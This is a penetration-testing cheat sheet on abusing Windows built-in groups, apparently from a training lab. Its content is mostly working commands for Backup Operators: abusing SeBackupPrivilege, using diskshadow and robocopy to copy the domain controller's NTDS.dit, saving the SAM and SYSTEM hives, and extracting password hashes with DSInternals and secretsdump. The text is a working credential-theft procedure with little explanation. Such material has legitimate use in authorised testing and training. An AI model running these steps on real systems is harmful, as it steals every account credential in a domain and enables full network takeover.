# Windows Built-in Groups

[Backup Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-backupoperators)
[Event Log Readers](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-eventlogreaders)
[DnsAdmins](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-dnsadmins)
[Hyper-V Administrators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-hypervadministrators)
[Print Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-printoperators)
[Server Operators](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#bkmk-serveroperators)

## Backup Operators

```Powershell
whoami /priv
whoami /groups

Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll

Set-SeBackupPrivilege
Get-SeBackupPrivilege

# Copying a protected file
Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt.txt' .\Contract.txt
```

### Attacking a Domain Controller - Copying NTDS.dit
[Diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow)

```Powershell
.\diskshadow.exe

set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
exit

dir E:\

Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV

# Dumping on Windows
Import-Module .\DSInternals.psd1
$key = Get-BootKey -SystemHivePath .\SYSTEM
Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
```

### Secretsdump

`secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL`


### Robocopy
[Robocopy](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)

`robocopy /B E:\Windows\NTDS .\ntds ntds.dit`
